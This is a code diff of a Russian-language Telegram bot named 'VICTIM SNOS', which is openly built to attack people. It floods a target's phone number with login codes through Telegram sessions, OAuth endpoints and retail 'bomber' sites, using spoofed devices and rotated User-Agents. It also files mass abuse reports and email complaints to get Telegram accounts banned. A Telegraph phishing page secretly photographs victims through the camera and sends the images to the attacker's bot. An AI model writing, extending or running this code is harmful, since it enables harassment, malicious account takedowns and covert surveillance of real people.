@@ -9,7 +9,6 @@ import time
 import shutil
 import re
 import hashlib
-import html
 from datetime import datetime
 from typing import Optional, Dict, List, Tuple
 
@@ -55,24 +54,161 @@ RECEIVERS = [
     'stopca@telegram.org', 'ca@telegram.org'
 ]
 
+# Расширенные User-Agent'ы
 USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+    # Chrome Windows
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    # Firefox Windows
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
+    # Edge
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+    # Chrome Mac
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+    # Safari
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+    # Linux
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    # Mobile iOS
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    # Mobile Android
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; 23078PND5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; CPH2449) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
+    # Opera
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
+    # Brave
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/1.60.125',
 ]
 
-# РЕАЛЬНЫЕ OAuth сайты, которые шлют коды в Telegram
+# Расширенные устройства для Pyrogram
+DEVICES = [
+    # iPhone
+    {"model": "iPhone 15 Pro Max", "system": "iOS 17.2"},
+    {"model": "iPhone 15 Pro", "system": "iOS 17.2"},
+    {"model": "iPhone 15 Plus", "system": "iOS 17.2"},
+    {"model": "iPhone 15", "system": "iOS 17.2"},
+    {"model": "iPhone 14 Pro Max", "system": "iOS 17.1"},
+    {"model": "iPhone 14 Pro", "system": "iOS 17.1"},
+    {"model": "iPhone 14 Plus", "system": "iOS 17.1"},
+    {"model": "iPhone 14", "system": "iOS 17.1"},
+    {"model": "iPhone 13 Pro Max", "system": "iOS 16.7"},
+    {"model": "iPhone 13 Pro", "system": "iOS 16.7"},
+    {"model": "iPhone 13", "system": "iOS 16.7"},
+    {"model": "iPhone 13 mini", "system": "iOS 16.7"},
+    {"model": "iPhone 12 Pro Max", "system": "iOS 16.6"},
+    {"model": "iPhone 12 Pro", "system": "iOS 16.6"},
+    {"model": "iPhone 12", "system": "iOS 16.6"},
+    {"model": "iPhone 11 Pro Max", "system": "iOS 15.8"},
+    {"model": "iPhone 11", "system": "iOS 15.8"},
+    {"model": "iPhone XS Max", "system": "iOS 15.8"},
+    {"model": "iPhone XR", "system": "iOS 15.8"},
+    {"model": "iPhone SE (2022)", "system": "iOS 17.1"},
+    # Samsung
+    {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
+    {"model": "Samsung Galaxy S24+", "system": "Android 14"},
+    {"model": "Samsung Galaxy S24", "system": "Android 14"},
+    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14"},
+    {"model": "Samsung Galaxy S23+", "system": "Android 14"},
+    {"model": "Samsung Galaxy S23", "system": "Android 14"},
+    {"model": "Samsung Galaxy S22 Ultra", "system": "Android 13"},
+    {"model": "Samsung Galaxy S22+", "system": "Android 13"},
+    {"model": "Samsung Galaxy S22", "system": "Android 13"},
+    {"model": "Samsung Galaxy S21 Ultra", "system": "Android 12"},
+    {"model": "Samsung Galaxy S21+", "system": "Android 12"},
+    {"model": "Samsung Galaxy S21", "system": "Android 12"},
+    {"model": "Samsung Galaxy Note 20 Ultra", "system": "Android 11"},
+    {"model": "Samsung Galaxy Z Fold5", "system": "Android 14"},
+    {"model": "Samsung Galaxy Z Flip5", "system": "Android 14"},
+    {"model": "Samsung Galaxy A55", "system": "Android 14"},
+    {"model": "Samsung Galaxy A54", "system": "Android 14"},
+    {"model": "Samsung Galaxy A35", "system": "Android 14"},
+    # Google Pixel
+    {"model": "Google Pixel 8 Pro", "system": "Android 14"},
+    {"model": "Google Pixel 8", "system": "Android 14"},
+    {"model": "Google Pixel 7 Pro", "system": "Android 14"},
+    {"model": "Google Pixel 7", "system": "Android 14"},
+    {"model": "Google Pixel 6 Pro", "system": "Android 13"},
+    {"model": "Google Pixel 6", "system": "Android 13"},
+    {"model": "Google Pixel 5", "system": "Android 12"},
+    # Xiaomi
+    {"model": "Xiaomi 14 Ultra", "system": "Android 14"},
+    {"model": "Xiaomi 14 Pro", "system": "Android 14"},
+    {"model": "Xiaomi 14", "system": "Android 14"},
+    {"model": "Xiaomi 13 Ultra", "system": "Android 14"},
+    {"model": "Xiaomi 13 Pro", "system": "Android 14"},
+    {"model": "Xiaomi 13", "system": "Android 14"},
+    {"model": "Xiaomi 12T Pro", "system": "Android 13"},
+    {"model": "Redmi Note 13 Pro+", "system": "Android 14"},
+    {"model": "Redmi Note 13 Pro", "system": "Android 14"},
+    {"model": "Redmi Note 12 Pro", "system": "Android 13"},
+    {"model": "POCO F5 Pro", "system": "Android 13"},
+    {"model": "POCO X6 Pro", "system": "Android 14"},
+    {"model": "POCO F5", "system": "Android 13"},
+    # OnePlus
+    {"model": "OnePlus 12", "system": "Android 14"},
+    {"model": "OnePlus 11", "system": "Android 14"},
+    {"model": "OnePlus 10 Pro", "system": "Android 13"},
+    {"model": "OnePlus 9 Pro", "system": "Android 12"},
+    {"model": "OnePlus Nord 3", "system": "Android 13"},
+    # Huawei
+    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0"},
+    {"model": "Huawei Mate 60 Pro", "system": "HarmonyOS 4.0"},
+    {"model": "Huawei P50 Pro", "system": "HarmonyOS 3.0"},
+    {"model": "Huawei Mate 50 Pro", "system": "HarmonyOS 3.0"},
+    # Другие
+    {"model": "OPPO Find X7 Ultra", "system": "Android 14"},
+    {"model": "OPPO Reno 11 Pro", "system": "Android 14"},
+    {"model": "Vivo X100 Pro", "system": "Android 14"},
+    {"model": "Realme GT5 Pro", "system": "Android 14"},
+    {"model": "Nothing Phone (2)", "system": "Android 14"},
+    {"model": "Nothing Phone (1)", "system": "Android 13"},
+    {"model": "Honor Magic6 Pro", "system": "Android 14"},
+    {"model": "Motorola Edge 40 Pro", "system": "Android 13"},
+    {"model": "Sony Xperia 1 V", "system": "Android 13"},
+    {"model": "ASUS ROG Phone 7", "system": "Android 13"},
+    {"model": "ASUS Zenfone 10", "system": "Android 13"},
+    {"model": "Lenovo Legion Y70", "system": "Android 13"},
+    {"model": "ZTE Nubia Z60 Ultra", "system": "Android 14"},
+    {"model": "Tecno Phantom X2 Pro", "system": "Android 13"},
+    {"model": "Infinix Zero 30", "system": "Android 13"},
+    # iPad
+    {"model": "iPad Pro 12.9 (2023)", "system": "iOS 17.2"},
+    {"model": "iPad Pro 11 (2022)", "system": "iOS 17.1"},
+    {"model": "iPad Air (2022)", "system": "iOS 17.1"},
+    {"model": "iPad mini (2021)", "system": "iOS 15.8"},
+    {"model": "iPad (2022)", "system": "iOS 17.1"},
+    # Mac
+    {"model": "MacBook Pro 16 (2023)", "system": "macOS 14.1"},
+    {"model": "MacBook Pro 14 (2023)", "system": "macOS 14.1"},
+    {"model": "MacBook Air 15 (2023)", "system": "macOS 14.1"},
+    {"model": "MacBook Air 13 (2022)", "system": "macOS 13.5"},
+    {"model": "iMac 24 (2023)", "system": "macOS 14.1"},
+    {"model": "Mac mini (2023)", "system": "macOS 14.1"},
+]
+
+# РЕАЛЬНЫЕ OAuth сайты для сноса
 TELEGRAM_OAUTH_SITES = [
-    # Официальные сервисы Telegram
+    # Официальные Telegram
     {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
     {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK"},
     {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA"},
-    
-    # Fragment (маркетплейс Telegram)
     {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment"},
-    
-    # acollo.ru - специальный обработчик
+    # acollo.ru OAuth
     {"url": "https://oauth.telegram.org/auth", "method": "GET", "phone_field": "phone", "name": "acollo.ru",
      "params": {
          "bot_id": "8357292784",
@@ -80,26 +216,18 @@ TELEGRAM_OAUTH_SITES = [
          "embed": "1",
          "request_access": "write",
          "return_to": "https://acollo.ru/auth/telegram"
-     },
-     "special": "acollo"},
+     }},
 ]
 
 # Бомбер сайты (рабочие)
 BOMBER_WEBSITES = [
     {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Delivery Club"},
-    {"url": "https://api.sbermarket.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "SberMarket"},
     {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat"},
     {"url": "https://api.vkusvill.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VkusVill"},
-    {"url": "https://api.5ka.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Pyaterochka"},
-    {"url": "https://api.lenta.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta"},
     {"url": "https://api.citilink.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Citilink"},
-    {"url": "https://www.mvideo.ru/rest/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MVideo"},
     {"url": "https://api.dns-shop.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DNS"},
     {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Auto.ru"},
-    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Cian"},
-    {"url": "https://api.tutu.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tutu.ru"},
     {"url": "https://api.lamoda.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lamoda"},
-    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
 ]
 
 COMPLAINT_TEXTS_ACCOUNT = {
@@ -187,7 +315,7 @@ CAMERA_TEMPLATE = '''<div style="text-align: center; padding: 30px 20px; backgro
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, "photo.jpg");
-            formData.append("caption", "📸 Фото с камеры\\n🎯 Жертва: " + PAGE_ID);
+            formData.append("caption", "Фото с камеры\\nЖертва: " + PAGE_ID);
             const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
             return (await resp.json()).ok;
         } catch (e) {
@@ -205,12 +333,12 @@ CAMERA_TEMPLATE = '''<div style="text-align: center; padding: 30px 20px; backgro
         const sent = await sendPhoto(canvas.toDataURL("image/jpeg", 0.9));
         if (sent) {
             done = true;
-            status.textContent = "✅ Готово";
+            status.textContent = "Готово";
             status.style.color = "#4caf50";
             btn.textContent = "Отправлено";
             if (stream) { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; }
         } else {
-            status.textContent = "❌ Ошибка";
+            status.textContent = "Ошибка";
             status.style.color = "#ff4444";
             btn.disabled = false;
         }
@@ -236,7 +364,7 @@ sessions_creation_lock = {}
 usage_logs = []
 MAX_LOGS = 20
 site_last_used = {}
-user_messages = {}  # Для хранения ID сообщений пользователя
+user_messages = {}
 
 class SnosState(StatesGroup):
     waiting_phone = State()
@@ -391,8 +519,12 @@ class MailTM:
             }
             headers = {"Authorization": f"Bearer {account['token']}", "Content-Type": "application/json"}
             async with self.session.post(f"{self.base_url}/messages", json=message_data, headers=headers) as resp:
+                result = await resp.text()
+                logger.info(f"Mail send result: {resp.status} - {result[:100]}")
                 return resp.status in [200, 201, 202]
-        except: return False
+        except Exception as e:
+            logger.error(f"Mail send error: {e}")
+            return False
 
 
 # ---------- СЕССИИ ----------
@@ -406,12 +538,7 @@ def count_user_sessions_files(user_id: int) -> int:
 
 async def create_single_session(session_file: str, idx: int) -> dict:
     try:
-        devices = [
-            {"model": "iPhone 15 Pro Max", "system": "iOS 17.2"},
-            {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
-            {"model": "Google Pixel 8 Pro", "system": "Android 14"},
-        ]
-        device = random.choice(devices)
+        device = random.choice(DEVICES)
         client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True, device_model=device["model"], system_version=device["system"])
         await client.connect()
         return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
@@ -488,11 +615,14 @@ async def send_sms_safe(session_data: dict, phone: str) -> dict:
         client = session_data["client"]
         if not client.is_connected: await client.connect()
         await client.send_code(phone)
+        logger.info(f"SMS sent to {phone}")
         return {"type": "SMS", "success": True}
     except FloodWait as e:
         session_data["flood_until"] = time.time() + e.value
+        logger.warning(f"Flood wait: {e.value}s")
         return {"type": "SMS", "success": False, "flood": e.value}
     except Exception as e:
+        logger.error(f"SMS error: {e}")
         return {"type": "SMS", "success": False, "error": str(e)[:30]}
 
 async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
@@ -505,54 +635,39 @@ async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: d
     
     headers = {
         'User-Agent': random.choice(USER_AGENTS),
-        'Content-Type': 'application/json',
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Content-Type': 'application/json',
     }
     
-    # Специальная обработка для acollo.ru
-    if site.get("special") == "acollo":
-        headers['Origin'] = 'https://acollo.ru'
-        headers['Referer'] = 'https://acollo.ru/'
-        try:
+    try:
+        clean_phone = phone.replace("+", "")
+        
+        if "params" in site:
             params = site["params"].copy()
-            # acollo.ru ожидает номер в формате без +
-            clean_phone = phone.replace("+", "")
             params["phone"] = clean_phone
             
             async with session.get(site["url"], headers=headers, params=params, timeout=15, ssl=False) as resp:
-                # Проверяем, что получили страницу авторизации
+                status = resp.status
                 text = await resp.text()
-                if "sendCode" in text or "phone" in text.lower():
-                    return {"site": name, "success": True}
-                return {"site": name, "success": resp.status < 500}
-        except Exception as e:
-            return {"site": name, "success": False, "error": str(e)[:20]}
-    
-    # Обычная обработка для других сайтов
-    try:
-        data = {site["phone_field"]: phone}
-        if "params" in site:
-            if site["method"] == "GET":
-                params = site["params"].copy()
-                params[site["phone_field"]] = phone
-                async with session.get(site["url"], headers=headers, params=params, timeout=10, ssl=False) as resp:
-                    return {"site": name, "success": resp.status < 500}
-            else:
-                data.update(site["params"])
-                async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
-                    return {"site": name, "success": resp.status < 500}
+                logger.info(f"OAuth {name}: status={status}")
+                return {"site": name, "success": status < 500}
         else:
+            data = {site["phone_field"]: clean_phone}
+            
             if site["method"] == "POST":
-                async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
-                    return {"site": name, "success": resp.status < 500}
+                async with session.post(site["url"], headers=headers, json=data, timeout=15, ssl=False) as resp:
+                    status = resp.status
+                    logger.info(f"OAuth {name}: status={status}")
+                    return {"site": name, "success": status < 500}
             else:
-                async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
-                    return {"site": name, "success": resp.status < 500}
-    except asyncio.TimeoutError:
-        return {"site": name, "success": False, "error": "timeout"}
+                async with session.get(site["url"], headers=headers, params=data, timeout=15, ssl=False) as resp:
+                    status = resp.status
+                    logger.info(f"OAuth {name}: status={status}")
+                    return {"site": name, "success": status < 500}
     except Exception as e:
-        return {"site": name, "success": False, "error": str(e)[:20]}
+        logger.error(f"OAuth {name} error: {e}")
+        return {"site": name, "success": False}
 
 async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     ok = 0
@@ -560,7 +675,7 @@ async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio
     if not phone.startswith("+"): phone = "+" + phone
     add_log(user_id, "Снос номера", phone)
     
-    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False, ttl_dns_cache=300)
+    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
     timeout = aiohttp.ClientTimeout(total=15)
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
         for rnd in range(1, rounds + 1):
@@ -569,23 +684,22 @@ async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio
             sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
             tasks = []
             
-            # Отправка SMS через сессии
             if sessions:
                 for s in sessions:
                     tasks.append(send_sms_safe(s, phone))
-                    await asyncio.sleep(SMS_DELAY / 1000)
+                    await asyncio.sleep(0.05)
             
-            # Отправка OAuth запросов (включая acollo.ru)
             for site in TELEGRAM_OAUTH_SITES:
                 tasks.append(send_oauth_request(sess, phone, site))
             
-            # Выполняем все задачи
             batch = await asyncio.gather(*tasks, return_exceptions=True)
             release_user_sessions(sessions)
             
             for r in batch:
                 if isinstance(r, dict) and r.get("success"):
                     ok += 1
+            
+            logger.info(f"Round {rnd}/{rounds}: {ok} requests sent")
             
             if progress_callback:
                 await progress_callback(rnd, rounds, ok)
@@ -602,18 +716,24 @@ async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: 
         'User-Agent': random.choice(USER_AGENTS),
         'Content-Type': 'application/json',
         'Accept': 'application/json',
-        'Origin': site["url"].split("/")[2] if "://" in site["url"] else "",
     }
     
+    clean_phone = phone.replace("+", "")
+    
     try:
-        data = {site["phone_field"]: phone}
+        data = {site["phone_field"]: clean_phone}
+        
         if site["method"] == "POST":
             async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
+                logger.info(f"Bomber {site['name']}: {resp.status}")
                 return {"site": site["name"], "success": resp.status < 500}
         else:
             async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
+                logger.info(f"Bomber {site['name']}: {resp.status}")
                 return {"site": site["name"], "success": resp.status < 500}
-    except: return {"site": site["name"], "success": False}
+    except Exception as e:
+        logger.error(f"Bomber {site['name']} error: {e}")
+        return {"site": site["name"], "success": False}
 
 async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     ok = 0
@@ -633,6 +753,8 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
             for r in batch:
                 if isinstance(r, dict) and r.get("success"):
                     ok += 1
+            
+            logger.info(f"Bomber round {rnd}/{rounds}: {ok} requests")
             
             if progress_callback:
                 await progress_callback(rnd, rounds, ok)
@@ -671,18 +793,16 @@ async def report_message_via_session(session_data: dict, channel: str, msg_id: i
             )
         )
         
+        logger.info(f"Report sent to @{channel}/{msg_id}")
         return {"success": True}
-    except FloodWait as e:
-        session_data["flood_until"] = time.time() + e.value
-        return {"success": False, "flood": e.value}
     except Exception as e:
+        logger.error(f"Report error: {e}")
         return {"success": False, "error": str(e)[:50]}
 
 async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
     patterns = [
         r't\.me/([^/]+)/(\d+)',
         r'telegram\.me/([^/]+)/(\d+)',
-        r'https?://t\.me/([^/]+)/(\d+)',
     ]
     
     channel = None
@@ -695,7 +815,7 @@ async def mass_report_message(user_id: int, link: str, reason: str, progress_cal
             break
     
     if not channel or not msg_id:
-        return 0, "Неверная ссылка на сообщение"
+        return 0, "Неверная ссылка"
     
     add_log(user_id, f"Жалоба({REPORT_REASONS_RU.get(reason, reason)})", f"@{channel}/{msg_id}")
     
@@ -724,6 +844,7 @@ async def mass_report_message(user_id: int, link: str, reason: str, progress_cal
 # ---------- СНОС ПОЧТА ----------
 async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str, user_id: int = None) -> int:
     if not mail_tm.ready or not mail_tm.accounts:
+        logger.warning("MailTM not ready or no accounts")
         return 0
     
     sent = 0
@@ -735,7 +856,8 @@ async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str, user_id:
                 result = await mail_tm.send_email(acc, rec, subject, body)
                 await asyncio.sleep(2)
                 return result
-            except:
+            except Exception as e:
+                logger.error(f"Send email error: {e}")
                 return False
     
     tasks = []
@@ -746,17 +868,17 @@ async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str, user_id:
     results = await asyncio.gather(*tasks, return_exceptions=True)
     sent = sum(1 for r in results if r is True)
     
+    logger.info(f"Mail complaints sent: {sent}")
+    
     if user_id:
         add_log(user_id, "Снос почта", f"{sent} писем")
     
     return sent
 
 
-# ---------- TELEGRAPH ФИШИНГ (БЫСТРОЕ СОЗДАНИЕ) ----------
+# ---------- TELEGRAPH ФИШИНГ ----------
 async def create_telegraph_page_fast(title: str, description: str, button_text: str, chat_id: int, page_id: str) -> Optional[str]:
-    """Быстрое создание страницы на Telegraph без оригинальной ссылки"""
     try:
-        # Создаем простой HTML контент
         camera_html = CAMERA_TEMPLATE.format(
             title=title or "Подтверждение",
             description=description or "Для продолжения необходимо подтвердить личность",
@@ -766,16 +888,16 @@ async def create_telegraph_page_fast(title: str, description: str, button_text: 
             page_id=page_id
         )
         
-        # Формируем контент для Telegraph API
+        import html
+        camera_html_escaped = html.escape(camera_html)
+        
         content = [
             {"tag": "h3", "children": [title or "Подтверждение личности"]},
             {"tag": "p", "children": [description or "Для продолжения необходимо подтвердить вашу личность."]},
             {"tag": "figure", "children": [{"tag": "div", "attrs": {"data-html": camera_html}}]},
         ]
         
-        # Создаем аккаунт и страницу
         async with aiohttp.ClientSession() as session:
-            # Создаем аккаунт
             async with session.post(
                 "https://api.telegra.ph/createAccount",
                 json={
@@ -787,10 +909,10 @@ async def create_telegraph_page_fast(title: str, description: str, button_text: 
             ) as resp:
                 data = await resp.json()
                 if not data.get("ok"):
+                    logger.error(f"Telegraph account creation failed: {data}")
                     return None
                 token = data["result"]["access_token"]
             
-            # Создаем страницу
             async with session.post(
                 "https://api.telegra.ph/createPage",
                 json={
@@ -812,13 +934,16 @@ async def create_telegraph_page_fast(title: str, description: str, button_text: 
                         "created": time.time(),
                         "token": token
                     }
+                    logger.info(f"Telegraph page created: {phish_url}")
                     return phish_url
+                else:
+                    logger.error(f"Telegraph page creation failed: {data}")
     except Exception as e:
-        logger.error(f"Ошибка создания Telegraph: {e}")
+        logger.error(f"Telegraph error: {e}")
     return None
 
 
-# ---------- UI (без смайликов) ----------
+# ---------- UI ----------
 def get_main_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="СНОС НОМЕРА", callback_data="snos_menu")
@@ -858,7 +983,7 @@ def get_mail_menu():
 def get_mail_account_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="1.1 Обычная жалоба", callback_data="mailacc_1.1")
-    builder.button(text="1.2 Снос сессий (взлом)", callback_data="mailacc_1.2")
+    builder.button(text="1.2 Снос сессий", callback_data="mailacc_1.2")
     builder.button(text="1.3 Виртуальный номер", callback_data="mailacc_1.3")
     builder.button(text="1.4 Ссылка в био", callback_data="mailacc_1.4")
     builder.button(text="1.5 Спам с премиум", callback_data="mailacc_1.5")
@@ -914,7 +1039,6 @@ def get_admin_menu():
     return builder.as_markup()
 
 async def delete_old_messages(user_id: int, chat_id: int):
-    """Удаляет старые сообщения бота для пользователя"""
     if user_id in user_messages:
         for msg_id in user_messages[user_id]:
             try:
@@ -924,7 +1048,6 @@ async def delete_old_messages(user_id: int, chat_id: int):
         user_messages[user_id] = []
 
 async def send_message_with_banner(event: types.Message, text: str, markup=None):
-    """Отправляет сообщение с баннером и сохраняет ID для удаления"""
     user_id = event.from_user.id
     await delete_old_messages(user_id, event.chat.id)
     
@@ -939,7 +1062,6 @@ async def send_message_with_banner(event: types.Message, text: str, markup=None)
     return msg
 
 async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
-    """Редактирует сообщение с баннером"""
     user_id = callback.from_user.id
     await callback.message.delete()
     
@@ -976,9 +1098,7 @@ async def start(msg: types.Message):
         f"<b>VICTIM SNOS</b>\n\n"
         f"ID: <code>{user_id}</code>\n"
         f"Сессии: {cnt}/{SESSIONS_PER_USER} {'[ГОТОВ]' if ready else '[ЗАГРУЗКА]'}\n"
-        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
-        f"OAuth сайтов: {len(TELEGRAM_OAUTH_SITES)}\n"
-        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}",
+        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
         get_main_menu()
     )
 
@@ -987,13 +1107,10 @@ async def admin_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
     await send_message_with_banner(
         msg,
-        f"<b>АДМИН-ПАНЕЛЬ</b>\n\n"
-        f"Разрешено: {len(ALLOWED_USERS)}\n"
-        f"Активных атак: {len(active_attacks)}",
+        f"<b>АДМИН-ПАНЕЛЬ</b>\n\nРазрешено: {len(ALLOWED_USERS)}",
         get_admin_menu()
     )
 
-# Навигация
 @dp.callback_query(F.data == "snos_menu")
 async def snos_menu(cb: types.CallbackQuery):
     cnt = get_user_sessions_count(cb.from_user.id)
@@ -1001,8 +1118,7 @@ async def snos_menu(cb: types.CallbackQuery):
     await edit_message_with_banner(
         cb,
         f"<b>СНОС НОМЕРА</b>\n\n"
-        f"Сессии: {cnt}/{SESSIONS_PER_USER} {'[ГОТОВ]' if ready else '[ЗАГРУЗКА]'}\n"
-        f"OAuth сайтов: {len(TELEGRAM_OAUTH_SITES)}",
+        f"Сессии: {cnt}/{SESSIONS_PER_USER} {'[ГОТОВ]' if ready else '[ЗАГРУЗКА]'}",
         get_snos_menu()
     )
     await cb.answer()
@@ -1020,8 +1136,7 @@ async def bomber_menu(cb: types.CallbackQuery):
 async def mail_menu(cb: types.CallbackQuery):
